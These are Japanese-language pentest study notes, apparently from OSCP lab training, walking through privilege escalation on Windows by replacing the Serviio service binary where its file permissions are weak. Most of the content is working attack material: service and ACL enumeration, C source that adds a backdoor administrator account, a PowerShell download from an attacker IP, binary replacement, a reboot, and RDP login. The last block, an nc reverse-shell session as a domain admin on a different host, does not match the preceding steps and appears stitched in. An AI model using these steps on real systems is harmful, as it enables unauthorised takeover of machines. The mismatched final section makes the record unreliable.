# Insecure File Permissions

### Serviioサービスでのケーススタディ

NT権限で実行されるサービスの安全でないファイルパーミッションを悪用する方法

* 攻撃対象ホストのWin32サービスを列挙する

  ```powershell
  Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}
  
  ・・・
  Serviio                      Running C:\Program Files\Serviio\bin\ServiioService.exe
  ```

  ※ユーザがダウンロードしたようなexeファイルがないかを確認する。特に`ProgramFIles`配下はユーザダウンロードしたアプリが入るので調査の価値あり

* icaclsを使って、対象サービスのパーミッションを列挙

  ```cmd
  icacls "C:\Program Files\Serviio\bin\ServiioService.exe"
  ```

  権限の見方は以下

  | MASK | PERMISSIONS             |
  | ---- | ----------------------- |
  | F    | Full access             |
  | M    | Modify access           |
  | RX   | Read and execute access |
  | R    | Read-only access        |
  | W    | Write-only access       |

* 置き換え用のexeファイルを作成する

  ```c
  #include <stdlib.h>
  
  int main ()
  {
    int i;
    
    i = system ("net user evil Ev!lpass /add");
    i = system ("net localgroup administrators evil /add");
    
    return 0;
  }
  ```

  * クロスコンパイル

    ```bash
    i686-w64-mingw32-gcc adduser.c -o adduser.exe
    ```

* 攻撃対象ホストに配送し、置き換えする

  ```
  powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://192.168.119.144:5555/adduser.exe', 'adduser.exe')
  ```

  ```cmd
  move "C:\Program Files\Serviio\bin\ServiioService.exe" "C:\Program Files\Serviio\bin\ServiioService_original.exe"
  move adduser.exe "C:\Program Files\Serviio\bin\ServiioService.exe"
  dir "C:\Program Files\Serviio\bin\"
  ```

* サービスの再起動を試みる

  ```
  net stop Serviio
  ```

  →権限なし

* Serviioサービスの開始オプションを確認する

  ```cmd
  wmic service where caption="Serviio" get name, caption, state, startmode
  ---
  C:\Users\admin\Documents>wmic service where caption="Serviio" get name, caption, state, startmode
  Caption  Name     StartMode  State
  Serviio  Serviio  Auto       Running
  ```

  ※Autoに設定されており自動的に開始される

* システムの再起動の権限の確認

  ```
  whoami /priv
  
  ----
  PRIVILEGES INFORMATION
  ----------------------
  
  Privilege Name                Description                          State
  ============================= ==================================== ========
  SeShutdownPrivilege           Shut down the system                 Disabled
  SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
  SeUndockPrivilege             Remove computer from docking station Disabled
  SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
  SeTimeZonePrivilege           Change the time zone                 Disabled
  ```

  `SeShutDownPrivilege`の権利があり、再起動可能

* 再起動する

  ```
  shutdown /r /t 0
  ```

* 追加したユーザでログインしなおす

  ```
  rdesktop -g 95% -u evil -p 'Ev!lpass' 192.168.144.10
  ```

  ```
  net localgroup Administrators
  ```

  ```
  ┌──(kali㉿kali)-[~/Documents/OSCP/21.ActiveDirectoryAttacks]
  └─$ nc -lnvp 12345
  listening on [any] 12345 ...
  connect to [192.168.119.131] from (UNKNOWN) [192.168.131.171] 49732
  Microsoft Windows [Version 10.0.17763.1757]
  (c) 2018 Microsoft Corporation. All rights reserved.
  
  C:\Windows\system32>whoami
  whoami                                                                                                                      
  exam\zensvc                                                                                                                 
                                                                                                                              
  C:\Windows\system32>whoami groups                                                                                           
  whoami groups                                                                                                               
  ERROR: Invalid argument/option - 'groups'.                                                                                  
  Type "WHOAMI /?" for usage.                                                                                                 
                                                                                                                              
  C:\Windows\system32>whoami /groups                                                                                          
  whoami /groups
  
  GROUP INFORMATION
  -----------------
  
  Group Name                                  Type             SID                                         Attributes                                                     
  =========================================== ================ =========================================== ===============================================================
  Everyone                                    Well-known group S-1-1-0                                     Mandatory group, Enabled by default, Enabled group             
  BUILTIN\Users                               Alias            S-1-5-32-545                                Mandatory group, Enabled by default, Enabled group             
  BUILTIN\Administrators                      Alias            S-1-5-32-544                                Mandatory group, Enabled by default, Enabled group, Group owner
  NT AUTHORITY\SERVICE                        Well-known group S-1-5-6                                     Mandatory group, Enabled by default, Enabled group             
  CONSOLE LOGON                               Well-known group S-1-2-1                                     Mandatory group, Enabled by default, Enabled group             
  NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                    Mandatory group, Enabled by default, Enabled group             
  NT AUTHORITY\This Organization              Well-known group S-1-5-15                                    Mandatory group, Enabled by default, Enabled group             
  LOCAL                                       Well-known group S-1-2-0                                     Mandatory group, Enabled by default, Enabled group             
  EXAM\Domain Admins                          Group            S-1-5-21-88558181-3850747640-3669402957-512 Mandatory group, Enabled by default, Enabled group             
  Authentication authority asserted identity  Well-known group S-1-18-1                                    Mandatory group, Enabled by default, Enabled group             
  EXAM\Denied RODC Password Replication Group Alias            S-1-5-21-88558181-3850747640-3669402957-572 Mandatory group, Enabled by default, Enabled group, Local Group
  Mandatory Label\High Mandatory Level        Label            S-1-16-12288  
  ```
  
  

